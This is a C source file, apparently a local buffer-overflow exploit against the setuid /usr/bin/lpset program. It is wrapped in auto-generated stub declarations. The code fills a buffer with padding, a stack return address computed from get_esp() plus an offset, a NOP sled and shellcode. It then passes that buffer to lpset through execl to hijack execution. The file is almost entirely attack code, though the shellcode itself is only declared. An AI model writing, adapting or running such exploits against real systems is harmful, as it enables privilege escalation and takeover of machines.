#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  execl (char*,char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 long get_esp () ; 
 int /*<<< orphan*/  printf (char*,long) ; 
 char* shellcode ; 
 size_t strlen (char*) ; 
 void* strtol (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

int main (int argc, char *argv[]) {
 
    long offset=410;
    int nop=64;
    int gab=40;
    long addr;
    char buffer[210];
    int i, a, b;   

if (argc > 1) offset = strtol(argv[1], NULL, 0);
if (argc > 2) gab = strtol(argv[2], NULL, 0);
if (argc > 3) nop = strtol(argv[2], NULL, 0);
 
   for (a = 0; a <gab; a++)
        buffer[a] = 'A';
 
  addr = get_esp() + offset;
 
  buffer[a++] = addr & 0x000000ff;
  buffer[a++] = (addr & 0x0000ff00) >> 8;  
  buffer[a++] = (addr & 0x00ff0000) >> 16;
  buffer[a++] = (addr & 0xff000000) >> 24;
 
  for ( ; a < nop; a++)
    buffer[a] = 0x90;
    
  for (b = 0; b < strlen(shellcode); b++, a++)
    buffer[a] = shellcode[b];
    
  buffer[strlen(buffer)] = '\0';

        printf("addr = 0x%x\n", addr);
        execl("/usr/bin/lpset", "lpset", "-n", "fns", "-r", buffer,"digit", NULL);
   
}